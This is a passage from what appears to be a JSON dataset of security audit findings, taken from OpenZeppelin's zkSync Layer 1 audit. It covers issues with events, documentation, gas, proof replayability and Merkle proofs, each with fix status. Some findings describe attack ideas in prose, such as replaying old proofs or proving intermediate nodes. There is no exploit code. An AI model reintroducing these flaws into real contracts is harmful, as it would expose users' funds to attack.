event](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IGovernance.sol#L20) emits the new governor. To ease tracking the responsibility of this important role, consider emitting both – the old and new governor – as *indexed* addresses.\n* In the [`IDiamondCut` interface](https://github.com/matter-labs/zksync-2-dev/tree/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IDiamondCut.sol)\n\t+ the [`EmergencyDiamondCutApproved` event](https://github.com/matter-labs/zksync-2-dev/tree/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IDiamondCut.sol#L32) only emits the address of the approver, but no information about the diamondcut proposal. Consider indexing the `address` field and adding the fields `currentProposalId`, `securityCouncilEmergencyApprovals` and the indexed field `proposedDiamondCutHash`.\n\t+ the [`Unfreeze` event](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IDiamondCut.sol#L30) does not emit additional information. Consider adding the `lastDiamondFreezeTimestamp` as an event field.\n\t+ the [`DiamondCutProposalCancelation` event](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IDiamondCut.sol#L24) does not emit additional information. Consider adding a `currentProposalId` field and the indexed field `proposedDiamondCutHash`.\n\n\nConsider emitting events for all state changes and include all relevant state transition information in them to allow precise monitoring via off-chain systems. Consider indexing event fields to facilitate their usage as a search key.\n\n\n**Update:** *Fixed in commit [`79fd845`](https://github.com/matter-labs/zksync-2-dev/commit/79fd8459fa77c3f70b175a8739338c578250a601).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10473",
      "title": "Lack of Documentation",
      "impact": "LOW",
      "content": "Docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned, and the events emitted. In the case of structs, docstrings should explain the overall purpose of the struct, each field contained in it, and clarify whether the struct is supposed to be persisted in storage or limited to memory and calldata. If the codebase does not have proper docstrings, it hinders reviewers’ understanding of the code’s intention and increases the maintenance effort for contributors.\n\n\nThroughout the [zksync-2-dev codebase](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/) there are several parts that do not have docstrings. For instance:\n\n\nIn the [`Storage.sol`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/Storage.sol) contract the following identifiers lack sufficient documentation:\n\n\n* The [`DiamondCutStorage`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/Storage.sol#L8) struct including all fields\n* The [`L2Log`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/Storage.sol#L19) struct including all fields\n* The storage information of the [`L2Message`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/Storage.sol#L32) struct as well as its `txNumberInBlock` field\n\n\nIn the [`IMailbox.sol`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IMailbox.sol) interface the following constructs lack sufficient documentation:\n\n\n* The [`L2CanonicalTransaction`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IMailbox.sol#L9) struct including all fields\n* The [`NewPriorityRequest`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IMailbox.sol#L65) event including all fields\n\n\nIn the [`Mailbox.sol`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Mailbox.sol) contract the following functions lack sufficient documentation:\n\n\n* The [`proveL2MessageInclusion`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L17) function\n* The [`proveL2LogInclusion`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L26) function\n* The [`l2TransactionBaseCost`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L65) function\n* The [`requestL2Transaction`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L74) function\n* The [`serializeL2Transaction`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L145) function\n\n\nIn the [`IExecutor.sol`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol) interface the following structs lack sufficient documentation:\n\n\n* The [`StoredBlockInfo`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol#L14) struct, especially fields `blockHash`, `indexRepeatedStorageChanges`, `stateRoot`\n* The [`CommitBlockInfo`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol#L38) struct, especially field `indexRepeatedStorageChanges`\n* The [`ProofInput`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol#L55) struct including all fields\n\n\nIn the [`DiamondCut.sol`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol) contract the following functions lack sufficient documentation:\n\n\n* The [`emergencyFreezeDiamond`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol#L73) function\n* The [`unfreezeDiamond`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol#L84) function\n* The [`approveEmergencyDiamondCutAsSecurityCouncilMember`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol#L96) function\n\n\nIn the [`IGetters.sol`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IGetters.sol) interface the following structs lack sufficient documentation:\n\n\n* The [`Facet`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IGetters.sol#L26) struct including all fields\n* [`SelectorExtended`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IGetters.sol#L31) struct including all fields\n* [`FacetExtended`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IGetters.sol#L36) struct including all fields\n\n\nIn the [`Diamond.sol`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol) library the following identifiers lack sufficient documentation:\n\n\n* The [`DiamondStorage`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L32) struct and all of its fields\n* The [`FacetCut`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L52) struct and all of its fields\n* The [`DiamondCutData`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L59) struct and all of its fields\n* The [`diamondCut`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L65) function\n* The [`getDiamondStorage`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L39) function\n\n\nIn the [`PriorityQueue.sol`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/PriorityQueue.sol) library the following identifiers lack sufficient documentation:\n\n\n* The [`Queue`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/PriorityQueue.sol#L19) struct and all its fields\n* The [`getLastProcessedPriorityTx`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/PriorityQueue.sol#L25) function\n* The [`getTotalPriorityTxs`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/PriorityQueue.sol#L29) function\n* The [`getSize`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/PriorityQueue.sol#L33) function\n* The [`isEmpty`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/PriorityQueue.sol#L37) function\n* The [`pushBack`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/PriorityQueue.sol#L41) function\n* The [`front`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/PriorityQueue.sol#L49) function\n* The [`popFront`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/PriorityQueue.sol#L55) function\n\n\nConsider thoroughly documenting all structs and functions (and their parameters) that are part of the contracts’ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html) (NatSpec). While applying the NatSpec tags, make sure to be consistent with the usage of the respective tag. For instance, use `@notice` for a general description and `@dev` for technical aspects.\n\n\n**Update:** *Fixed in commit [`8abb05c`](https://github.com/matter-labs/zksync-2-dev/commit/8abb05ca6998f1d576e9eb6ed7ec96f357a408f0).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10472",
      "title": "Getter returns misleading value",
      "impact": "LOW",
      "content": "In the [`GettersFacet` contract](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Getters.sol), the function [`isFunctionFreezable`](https://github.com/matter-labs/zksync-2-dev//blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Getters.sol#L53) returns a Boolean value indicating whether a given selector is freezable or not. This value is taken from storage without any prior validation. At the same time, any uninitialized storage in Solidity contains the default value zero/false.\n\n\nQuerying the function `isFunctionFreezable` for an unknown selector will return `false`, thereby misleading the user to believe that the selector is used within the Diamond and is not freezable.\n\n\nConsider validating the existence of the selector by requiring that the facet address of the selector is registered.\n\n\n**Update:** *Fixed in commit [`cfe6f54`](https://github.com/matter-labs/zksync-2-dev/commit/cfe6f54fe65759e43b407fb759704f3b7fc4cfed).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10471",
      "title": "Interface and contract function parameter mismatch",
      "impact": "LOW",
      "content": "The `revertBlocks` function has a different parameter name in [`IExecutor`](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IExecutor.sol#L70) compared to [`ExecutorFacet`](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L238). While in the interface the `_blocksToRevert` parameter suggests reverting a relative amount of blocks, the logic sets an absolute `_newLastBlock` which is confusing.\n\n\nFurther, in the `requestL2Transaction` function two parameters have a mismatch between the [`MailboxFacet`](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L74) and the [`IMailbox` interface](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/interfaces/IMailbox.sol#L50).\n\n\nConsider correcting the above mismatches in favor of consistency and clarity.\n\n\n**Update:** *Fixed in commit [`c0600e0`](https://github.com/matter-labs/zksync-2-dev/commit/c0600e08cdbb7aa21643e63edfa2198f628471fd).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10470",
      "title": "Gas optimizations",
      "impact": "LOW",
      "content": "Throughout the [codebase](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts) there are multiple instances where gas costs can be optimized:\n\n\n* In [line 162](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol#L162) of the [`Diamond` library](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Diamond.sol) the `uint16` cast is unnecessary and can be removed.\n* Using the `delete` keyword instead of overwriting with the default value saves gas in these instances:\n\t+ [line 33](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Governance.sol#L33) of Governance facet.\n\t+ [line 119-121](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol#L119-L121) of `DiamondCutFacet` contract.\n* In the `approveEmergencyDiamondCutAsSecurityCouncilMember` function, the [`s.diamondCutStorage.currentProposalId` variable](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol#L100) can be written to stack and reused.\n* In the [`ExecutorFacet` contract](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol) on line [113](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L113) and [155](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L155) two `bytes32` values are encoded and hashed. Consider using the `abi.encode` function for the encoding to be more gas efficient.\n* In the [`ExecutorFacet` contract](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol), consider writing the [`_maxU256` return value](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L240) to stack to save on the following `s.totalBlocksCommitted` storage reads.\n\n\nConsider applying the above changes to be more gas efficient.\n\n\n**Update:** *Fixed in commit [`5a4e81a`](https://github.com/matter-labs/zksync-2-dev/commit/5a4e81aa437eb914ff0b308c3a4336d00260e224). However, the fix introduced a redundant check of conditions within the function `approveEmergencyDiamondCutAsSecurityCouncilMember`.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10469",
      "title": "Freezability differences between logical components",
      "impact": "LOW",
      "content": "The usage of the Diamond Proxy pattern allows very modular changes to the system. The standard foresees moving individual selectors from facet to facet. Hence, one logical component (e.g. the `ExecutorFacet`) could be split into two facets, due to patching a single function and migrating the selector to the new facet, while the rest of the logic is kept in the old facet. As the first selector to the new facet defines the freezability, this could result in two different freeze capabilities for one high-level logical component (`ExecutorFacet`).\n\n\nImplementing checks to cover the joint freezability for the logical facet would introduce additional overhead. Instead, consider extensively documenting this behavior in the [`DiamondCutFacet` contract](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol).\n\n\n**Update:** *Acknowledged, not fixed. The Matter Labs team states:*\n\n\n\n> We acknowledge that this issue raises a valid concern and we are aware that overall documentation improvement is due. This has been in our backlog already and we have now adjusted the priority accordingly.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10468",
      "title": "lastDiamondFreezeTimestamp is unused",
      "impact": "LOW",
      "content": "In the `DiamondCutFacet` contract, the diamond can be frozen to allow inspection of the protocol’s security. Currently, as part of the [`emergencyFreezeDiamond` function](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol#L73), [`s.diamondCutStorage.lastDiamondFreezeTimestamp`](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/DiamondCut.sol#L79) is set but not used elsewhere in the code.\n\n\nConsider either implementing a use-case for this variable or removing it.\n\n\n**Update**: *Acknowledged, not fixed. The Matter Labs team states:*\n\n\n\n> While this feature was not included into this release we prefer to keep the variable to facilitate the rollout of the feature once it is ready.\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10467",
      "title": "DiamondInit can be initialized itself",
      "impact": "LOW",
      "content": "The [`DiamondInit` contract](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/DiamondInit.sol) is designed to initialize the `DiamondProxy` or any new facet via a `delegatecall` from the proxy contract. Therefore, the `DiamondInit` contract is deployed on its own with an unprotected [`initialize` function](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/DiamondInit.sol#L19).\n\n\nHence, anyone could initialize the deployed instance of the `DiamondInit` contract itself. While this isn’t identified as a threat, it is good practice to prevent arbitrary callers from initializing contracts.\n\n\nConsider initializing the `DiamondInit` contract via the `constructor` or adding a security mechanism to the `initialize` function.\n\n\n**Update:** *Fixed in commit [`c9089a5`](https://github.com/matter-labs/zksync-2-dev/commit/c9089a5d3c7a8d03fc911a2b0e09bcd6e0e63fde).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10466",
      "title": "_proveBlock while loop could run out of gas",
      "impact": "LOW",
      "content": "In the [`ExecutorFacet` contract](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol) within the [`proveBlocks` function](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L194), there is a while loop to skip already verified blocks. The loop condition is defined as:\n\n\n\n\n```\nwhile (_hashStoredBlockInfo(_committedBlocks[i]) != firstUnverifiedBlockHash)\n\n```\n\n\nTherefore, if the committed blocks do no contain the first unverified block, this loop will eventually run out of gas and revert.\n\n\nConsider limiting the number of loop iterations to the length of the `_committedBlocks` array and reverting with an expressive error message in case the block was not found.\n\n\n**Update:** *Fixed in commit [`df107f0`](https://github.com/matter-labs/zksync-2-dev/commit/df107f0ae33b66598da74526380ad73c0506fe0c).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10465",
      "title": "Proof replayability",
      "impact": "MEDIUM",
      "content": "In the [`proveBlocks` function](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L194) of the `ExecutorFacet` contract, there is no linkage between the committed blocks and the proof. The respective check is commented out in [line 213](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Executor.sol#L213). However, as it is commented out, the following is applicable.\n\n\nThe provided proof data is self-contained. Hence, the validator verifies that the given proof is valid in itself. Seeing the validator as a black box, it is assumed that there is no back checking against the committed blocks provided during the call. Therefore, the independence between the committed blocks and proof suggests a replay attack. By providing any formerly valid proof the previously committed blocks would be validated. Thus, all users could verify committed blocks, whether valid or not.\n\n\nAs documented in the code, the necessary check is there but commented out, which is based on the argument that the [`Verifier` contract](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/Verifier.sol) is not yet implemented. However, the commitment check between the blocks and proof has nothing to do with the `Verifier`. Therefore, consider incorporating this crucial check as part of the finalized codebase.\n\n\n**Update**: *Fixed in commit [`64d6aec`](https://github.com/matter-labs/zksync-2-dev/commit/64d6aec72d7f91eabd730aa39db23e9f7b40d931).*",
      "summary": "\nA bug has been found in the `proveBlocks` function of the `ExecutorFacet` contract. This bug causes there to be no linkage between the committed blocks and the proof. This means that the validator will verify the given proof without back checking against the committed blocks, meaning a replay attack is possible. This is because any formerly valid proof will be validated for previously committed blocks. The necessary check is already present in the code but is commented out. This is because the `Verifier` contract is not yet implemented, however, this check has nothing to do with the `Verifier`. To fix the bug, the check should be included in the finalized codebase. The bug has now been fixed in commit `64d6aec72d7f91eabd730aa39db23e9f7b40d931`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10464",
      "title": "Merkle library verifies intermediate inputs",
      "impact": "MEDIUM",
      "content": "The [`Merkle` library](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/libraries/Merkle.sol) enables verification of a Merkle proof by performing an inclusion check of an input against a binary tree. This works by consecutively hashing concatenated sibling nodes until a root hash is generated. The input is one of the leaf hash values, while the proof is a path through the tree containing the missing hash information to regenerate the root.\n\n\nAn issue arises in this library, due to the arbitrary length of the proof. This allows shorter paths to resolve to the same root. Hence, the known hash of an intermediate node is a valid input as well. To visualize, considering the leaf nodes `h0` and `h1`, the hashed concatenation `hash(h0 || h1)` of those hashes would be a valid input along a shorter path. An attacker could utilize the known pre-image to prove its inclusion in the tree. For the standalone library this is a critical problem.\n\n\nIn this particular codebase the `Merkle` library is solely used in the [`MailboxFacet` contact](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Mailbox.sol) to [prove the inclusion of a transaction](https://github.com/matter-labs/zksync-2-dev/blob/c05b49d7e303996f60a0e35f18ef224e45ee19f5/contracts/ethereum/contracts/zksync/facets/Mailbox.sol#L35) within a set of layer 2 logs. Thus, only inputs of type `L2Log` with a length of 88 bytes are legitimate, while the pre-images of size 64 bytes contained within the Merkle tree are not. However, any future usage on 64 bytes input would lead to a critical vulnerability.\n\n\nIt was also stated that the incomplete tree of fixed size is filled with the default hash `hash(\"\")`. This allows an attacker to prove the inclusion of empty bytes by default. Although, no threat was identified for the contracts in scope.\n\n\nConsider strictly checking the path length of the proof against the desired Merkle tree depth to mitigate the first issue. Further, consider using a default leaf hash with unknown pre-image as countermeasure to the second attack. With respect to documentation, consider sticking to the “leaf” wording for variable naming.\n\n\n**Update**: *Fixed in commit [`7eb51d9`](https://github.com/matter-labs/zksync-2-dev/commit/7eb51d9de839644b6c1aa8907111ce2f00ddc2ad). Additional checks have been applied outside of the Merkle library to filter malicious inputs. The library itself remains vulnerable to the attack if used in a different context. A note about this problem was added to the function documentation with commit [`5f02309`](https://github.com/matter-labs/zksync-2-dev/commit/5f02309bcb63e7ca96f2b0fdd5595005191cf248).*",
      "summary": "\nA bug was reported in the Merkle library, which enables verification of a Merkle proof by performing an inclusion check of an input against a binary tree. The issue arises due to the arbitrary length of the proof, which allows shorter paths to resolve to the same root. An attacker could utilize the known pre-image to prove its inclusion in the tree. \n\nIn the codebase, the Merkle library is used in the MailboxFacet contact to prove the inclusion of a transaction within a set of layer 2 logs. This means that only inputs of type L2Log with a length of 88 bytes are legitimate, while the pre-images of size 64 bytes contained within the Merkle tree are not. However, any future usage on 64 bytes input would lead to a critical vulnerability.\n\nAnother issue was also reported, which states that the incomplete tree of fixed size is filled with the default hash “hash(“”)”. This allows an attacker to prove the inclusion of empty bytes by default.\n\nTo mitigate these issues, it was suggested to strictly check the path length of the proof against the desired Merkle tree depth. Additionally, it was suggested to use a default leaf hash with unknown pre-image as a countermeasure. Finally, it was suggested to stick to the “leaf” wording for variable naming. The bug was fixed in commit 7eb51d9 and a note about the problem was added to the function documentation with commit 5f02309.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "zkSync Layer 1 Audit",
      "source_link": "https://blog.openzeppelin.com/zksync-layer-1-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10463",
      "title": "Freezable property applies to individual selectors instead of facets",
      "impact": "MEDIUM",
